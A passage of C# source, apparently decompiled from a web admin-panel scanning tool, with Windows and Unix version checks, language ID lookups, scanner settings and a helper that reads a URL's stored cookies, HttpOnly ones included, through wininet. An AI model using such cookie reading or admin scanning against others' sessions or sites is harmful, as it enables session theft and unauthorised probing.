                return (Environment.OSVersion.Platform == PlatformID.Unix);
            }
        }

        public static bool IsWindows2000
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32NT) && (Environment.OSVersion.Version.Major == 5)) && (Environment.OSVersion.Version.Minor == 0));
            }
        }

        public static bool IsWindows2003
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32NT) && (Environment.OSVersion.Version.Major == 5)) && (Environment.OSVersion.Version.Minor == 2));
            }
        }

        public static bool IsWindows7
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32NT) && (Environment.OSVersion.Version.Major == 6)) && (Environment.OSVersion.Version.Minor == 1));
            }
        }

        public static bool IsWindows98
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32Windows) && (Environment.OSVersion.Version.Minor == 10)) && (Environment.OSVersion.Version.Revision.ToString() != "2222A"));
            }
        }

        public static bool IsWindows98Second
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32Windows) && (Environment.OSVersion.Version.Minor == 10)) && (Environment.OSVersion.Version.Revision.ToString() == "2222A"));
            }
        }

        public static bool IsWindowsVista
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32NT) && (Environment.OSVersion.Version.Major == 6)) && (Environment.OSVersion.Version.Minor == 0));
            }
        }

        public static bool IsWindowsXP
        {
            get
            {
                return (((Environment.OSVersion.Platform == PlatformID.Win32NT) && (Environment.OSVersion.Version.Major == 5)) && (Environment.OSVersion.Version.Minor == 1));
            }
        }

        public string k8adminDir { get; set; }

        public int k8ScanAdminNum { get; set; }

        public string k8urlScanAdmin { get; set; }

        internal static class CookieReader
        {
            private const int INTERNET_COOKIE_HTTPONLY = 0x2000;

            public static string GetCookie(string url)
            {
                int capacity = 0x200;
                StringBuilder cookieData = new StringBuilder(capacity);
                if (!InternetGetCookieEx(url, null, cookieData, ref capacity, 0x2000, IntPtr.Zero))
                {
                    if (capacity < 0)
                    {
                        return null;
                    }
                    cookieData = new StringBuilder(capacity);
                    if (!InternetGetCookieEx(url, null, cookieData, ref capacity, 0x2000, IntPtr.Zero))
                    {
                        return null;
                    }
                }
                return cookieData.ToString();
            }

            [DllImport("wininet.dll", SetLastError=true)]
            private static extern bool InternetGetCookieEx(string url, string cookieName, StringBuilder cookieData, ref int size, int flags, IntPtr pReserved);
        }

        public class EnvironmentLang
        {
            [DllImport("kernel32.dll")]
            private static extern ushort GetSystemDefaultLangID();
            [DllImport("kernel32.dll")]
            private static extern ushort GetUserDefaultLangID();
            [DllImport("kernel32.dll")]
            private static extern ushort GetUserDefaultUILanguage();

            public static ushort SystemDefaultLangID
            {
                get
                {
                    return GetSystemDefaultLangID();
                }
            }

            public static ushort UserDefaultLangID
            {
                get
                {
                    return GetUserDefaultLangID();
                }
            }

            public static ushort UserDefaultUILanguage
            {
                get
                {
                    return GetUserDefaultUILanguage();
                }
            }
        }
    }
}

